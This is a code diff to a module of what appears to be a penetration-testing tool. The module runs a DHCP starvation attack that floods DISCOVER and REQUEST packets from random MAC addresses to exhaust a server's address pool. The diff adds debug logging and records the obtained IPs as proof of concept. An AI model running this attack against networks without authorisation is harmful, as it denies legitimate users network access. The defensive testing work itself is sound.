@@ -1,5 +1,13 @@
-from ptsrvtester.protocols.dhcp.utils.registry import (random_xid, random_mac, 
-                                                       sendp, prepare_discover_packet, sniff, BOOTP, prepare_request_packet)
+from ptsrvtester.protocols.dhcp.utils.registry import (
+    random_xid,
+    random_mac, 
+    sendp,
+    prepare_discover_packet,
+    sniff,
+    BOOTP,
+    prepare_request_packet,
+    debug_packet
+)
 
 
 
@@ -12,7 +20,8 @@ def _run_starvation(ctx):
     """Run DHCP starvation attack"""
     ctx.out("Running DHCP starvation attack...", "WARNING", indent=4)
     ctx.out("Press Ctrl+C to stop", "INFO", indent=4)
-
+    obtained_ips = []
+    
     try:
         count = 0
         max_count = ctx.count if hasattr(ctx, 'count') and ctx.count else None
@@ -24,12 +33,15 @@ def _run_starvation(ctx):
 
             # Send DISCOVER
             offer_filter = f"udp and src port 67 and (ether dst ff:ff:ff:ff:ff:ff or ether dst {src_mac})"
-            sendp(prepare_discover_packet(src_mac, transaction_id), ctx.interface, verbose=False)
+            discover_pkt = prepare_discover_packet(src_mac, transaction_id)
+            debug_packet(ctx, "Sent", discover_pkt)
+            sendp(discover_pkt, ctx.interface, verbose=False)
 
             # Wait for OFFER
             def is_offer(packet):
                 nonlocal requested_ip
                 if packet.haslayer(BOOTP) and packet[BOOTP].xid == transaction_id:
+                    debug_packet(ctx, "Received", packet)
                     if packet[BOOTP].yiaddr != "0.0.0.0":
                         requested_ip = packet[BOOTP].yiaddr
                         return True
@@ -40,9 +52,12 @@ def _run_starvation(ctx):
 
             if requested_ip:
                 # Send REQUEST
-                sendp(prepare_request_packet(src_mac, transaction_id, requested_ip),
+                req_packet = prepare_request_packet(src_mac, transaction_id, requested_ip)
+                debug_packet(ctx, "Sent", req_packet)
+                sendp(req_packet,
                       ctx.interface, verbose=False)
                 ctx.out(f"[+] Obtained {requested_ip} for {src_mac}", "OK", indent=4)
+                obtained_ips.append(requested_ip)
                 count += 1
             else:
                 ctx.out("[-] No OFFER received, server may be exhausted", "WARNING", indent=4)
@@ -54,7 +69,7 @@ def _run_starvation(ctx):
         ctx.out(f"[-] Error during starvation: {str(e)}", "ERROR", indent=4)
 
     ctx.out(f"[*] Total IPs obtained: {count}", "INFO", indent=4)
-    ctx.ptjsonlib.add_vulnerabiltiy("PTV-DHCP-STARVATION")
+    ctx.ptjsonlib.add_vulnerabiltiy("PTV-SVC-DHCP-STARV", poc={"obtained_ips": obtained_ips})
 
 def run(ctx):
     _run_starvation(ctx)
